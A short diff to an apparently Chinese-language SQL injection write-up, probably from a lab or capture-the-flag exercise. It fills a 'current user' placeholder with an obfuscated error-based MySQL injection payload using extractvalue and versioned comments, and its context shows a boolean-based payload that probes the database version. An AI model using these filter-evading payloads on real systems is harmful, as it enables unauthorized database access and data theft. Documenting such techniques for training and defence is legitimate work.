@@ -159,8 +159,9 @@ false'||`char_length`(@@global.`version`)!=23||'
 ![false](image-8.png)
 **当前用户 user**
 ```
-待定
+false'|exTRACTvaLue/*%0a*//*!50050(1,cuRrent_UsEr)*/|'
 ```
+![success](image-13.png)
 
 **当前数据库 database**
 ```
